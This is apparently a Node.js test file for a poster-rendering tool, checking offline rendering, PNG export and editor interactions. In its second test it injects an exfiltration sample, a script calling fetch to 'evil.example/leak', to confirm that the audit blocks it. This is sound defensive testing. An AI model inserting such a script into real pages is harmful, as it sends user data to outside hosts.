import assert from 'node:assert/strict';
import { readFile, writeFile, rm, mkdir } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { resolve, dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { createRequire } from 'node:module';
import { renderPosterHtml, extractSpecFromHtml } from '../scripts/render.mjs';
import { auditHtmlOffline } from '../scripts/audit.mjs';
import { exportHtmlToPng } from '../scripts/poster.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const SKILL_ROOT = resolve(HERE, '..');
const EXAMPLE_JSON = join(SKILL_ROOT, 'examples', 'gateway-framework.json');
const DEMO_HTML = join(SKILL_ROOT, 'demo', 'demo.html');
const DEMO_SVG = join(SKILL_ROOT, 'demo', 'demo.svg');
const TEMP_DIR = resolve(SKILL_ROOT, '..', '..', '..', 'temp', 'tech-poster-test');

async function run() {
  await mkdir(TEMP_DIR, { recursive: true });

  // 1. 正常示例渲染 + 静态离线安全审计 + 默认珠峰蓝背景验证
  const raw = JSON.parse(await readFile(EXAMPLE_JSON, 'utf8'));
  const html = await renderPosterHtml(raw, { baseDir: dirname(EXAMPLE_JSON) });
  const audit = auditHtmlOffline(html);
  assert.equal(audit.ok, true, `正常示例离线审计应通过，实际错误: ${JSON.stringify(audit.errors)}`);
  assert.equal(audit.externalUrls, 0);
  assert.ok(html.includes('data-bg="everest-blue"'), '默认背景应为 everest-blue（珠峰蓝）');
  assert.ok(existsSync(DEMO_HTML) && existsSync(DEMO_SVG), 'skill 内应包含 demo/demo.html 与 demo/demo.svg');
  assert.equal(auditHtmlOffline(await readFile(DEMO_HTML, 'utf8')).ok, true, 'demo/demo.html 必须通过离线零外链审计');
  console.log('[PASS] 1. 示例与 demo/demo.html 渲染及零外链静态审计通过（默认珠峰蓝背景）');

  // 2. 注入外链必须被静态审计阻断
  const poisonedGoogleFont = html.replace('</head>', '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">\n</head>');
  assert.equal(auditHtmlOffline(poisonedGoogleFont).ok, false, '注入 Google Fonts 外链必须被审计阻断');

  const poisonedFetch = html.replace('</body>', '<script>fetch("https://evil.example/leak");</script></body>');
  assert.equal(auditHtmlOffline(poisonedFetch).ok, false, '注入 fetch 外传脚本必须被审计阻断');
  console.log('[PASS] 2. 外链样式与外传脚本均被静态审计准确阻断');

  // 3. 远程图片 URL 必须在渲染层就被拒绝
  const remoteImgSpec = structuredClone(raw);
  remoteImgSpec.sections.push({
    type: 'diagram',
    title: '非法远程图测试',
    file: 'https://example.com/leak.png'
  });
  await assert.rejects(
    () => renderPosterHtml(remoteImgSpec, { baseDir: dirname(EXAMPLE_JSON) }),
    /安全拦截/
  );
  console.log('[PASS] 3. 远程图片路径在渲染层即被安全拦截');

  // 4. HTML 内嵌 #poster-data 提取与跨目录自包含增量换肤换背景重渲染
  const extracted = extractSpecFromHtml(html);
  assert.equal(extracted.title, raw.title);
  extracted.theme = 'slate-dark';
  extracted.background = 'everest-night';
  const darkHtml = await renderPosterHtml(extracted, { baseDir: TEMP_DIR });
  assert.equal(auditHtmlOffline(darkHtml).ok, true);
  assert.ok(darkHtml.includes('data-theme="slate-dark"') && darkHtml.includes('data-bg="everest-night"'));
  console.log('[PASS] 4. HTML 数据块跨目录自包含恢复与暗夜/珠峰星夜重渲染通过');

  // 5. Playwright CLI 离线 PNG 导出 + 分段导出 + 零外网拦截 + 尺寸与溢出校验
  const outHtml = join(TEMP_DIR, 'gateway-poster.html');
  const outPng = join(TEMP_DIR, 'gateway-poster.png');
  await writeFile(outHtml, html, 'utf8');

  const exp = await exportHtmlToPng(outHtml, outPng, { scale: 2, split: true, width: raw.width });
  assert.equal(exp.runtimeBlockedRequests, 0, '运行时拦截外网请求数必须为 0');
  assert.equal(exp.horizontalOverflow, false, `不应存在横向溢出: ${JSON.stringify(exp.overflowNodes)}`);
  assert.ok(exp.pixelWidth >= 2150, `2x PNG 宽度应约 2160px，实际 ${exp.pixelWidth}`);
  assert.ok(exp.panels.length === raw.sections.length + 1);
  console.log(`[PASS] 5. CLI 离线 PNG 导出与分段校验通过：${exp.pixelWidth}x${exp.pixelHeight}px（${exp.browser}，分段 ${exp.panels.length} 张）`);

  // 6. 浏览器端交互实测（file:// 打开 demo/demo.html）：侧边栏改字、增删栏目、切背景、离线 DOM→PNG 剪贴板管线
  const req = createRequire(resolve(process.cwd(), 'package.json'));
  const { chromium } = req('playwright');
  const browser = await chromium.launch({ channel: 'msedge', headless: true });
  const blocked = [];
  try {
    const context = await browser.newContext({ viewport: { width: 1520, height: 960 } });
    const page = await context.newPage();
    await page.route('**/*', (route) => {
      const url = route.request().url();
      if (/^(?:file:|data:|blob:|about:)/i.test(url)) return route.continue();
      blocked.push(url);
      return route.abort('blockedbyclient');
    });

    await page.goto(pathToFileURL(DEMO_HTML).href, { waitUntil: 'load' });

    // 6a. 默认珠峰蓝背景与珠峰装饰 SVG 存在
    const initBg = await page.evaluate(() => ({
      bg: document.documentElement.getAttribute('data-bg'),
      hasEverest: Boolean(document.querySelector('.hero-deco--everest')),
      sectionCount: document.querySelectorAll('.poster-section').length
    }));
    assert.equal(initBg.bg, 'everest-blue');
    assert.equal(initBg.hasEverest, true);
    assert.equal(initBg.sectionCount, raw.sections.length);

    // 6b. 打开侧边栏，手动修改第 1 个栏目的标题文字，验证画布实时联动
    await page.click('#tp-toggle-editor');
    await page.waitForSelector('body.sidebar-open #ed-group-sec-0 input.ed-input');
    await page.fill('#ed-group-sec-0 input.ed-input', '手动修改后的栏目标题');
    const updatedTitle = await page.textContent('.poster-section[data-section-index="0"] .section-title');
    assert.equal(updatedTitle?.trim(), '手动修改后的栏目标题');

    // 6c. 侧边栏新增一个 FAQ 栏目，再删除它
    await page.selectOption('#tp-add-section-type', 'qa');
    await page.click('.ed-add-section button');
    const afterAddCount = await page.locator('.poster-section').count();
    assert.equal(afterAddCount, raw.sections.length + 1, '新增栏目后画布栏目数应 +1');

    const lastSecCard = `#ed-group-sec-${raw.sections.length}`;
    await page.click(`${lastSecCard} button:has-text("删除栏目")`);
    const afterDelCount = await page.locator('.poster-section').count();
    assert.equal(afterDelCount, raw.sections.length, '删除栏目后画布栏目数应恢复');

    // 6d. 切换背景为电路纹，再切回珠峰蓝
    await page.selectOption('#tp-bg-select', 'circuit-board');
    assert.equal(await page.evaluate(() => document.documentElement.getAttribute('data-bg')), 'circuit-board');
    await page.selectOption('#tp-bg-select', 'everest-blue');
    assert.equal(await page.evaluate(() => document.documentElement.getAttribute('data-bg')), 'everest-blue');

    // 6e. 在 file:// 协议下验证浏览器端离线 DOM → PNG 光栅化管线（复制到剪贴板与下载 PNG 共用核心）
    const pngRes = await page.evaluate(async () => {
      const res = await window.TechPoster.renderPngBlob(1.5);
      const buf = new Uint8Array(await res.blob.arrayBuffer());
      const isPng = buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47;
      return { size: res.blob.size, type: res.blob.type, width: res.width, height: res.height, scale: res.scale, isPng };
    });
    assert.equal(pngRes.isPng, true, '浏览器端离线光栅化必须产出合法 PNG 二进制');
    assert.equal(pngRes.type, 'image/png');
    assert.ok(pngRes.size > 50000, `PNG 字节数应 > 50KB，实际 ${pngRes.size}`);
    assert.equal(blocked.length, 0, `交互全流程零外网请求，实际拦截: ${blocked.join(', ')}`);

    // 顺便截一张带展开侧边栏的界面预览图到 temp 供目检
    await page.screenshot({ path: resolve(SKILL_ROOT, '..', '..', '..', 'temp', 'tech-poster-demo', 'sidebar-preview.png') });
    console.log(`[PASS] 6. 浏览器交互与离线 PNG 光栅化全通过：${pngRes.width}x${pngRes.height}px（${Math.round(pngRes.size / 1024)}KB，外网请求=0）`);
  } finally {
    await browser.close();
  }

  await rm(TEMP_DIR, { recursive: true, force: true });
  console.log('\nALL TESTS PASSED');
}

run().catch((err) => {
  console.error('TEST FAILED:', err);
  process.exit(1);
});
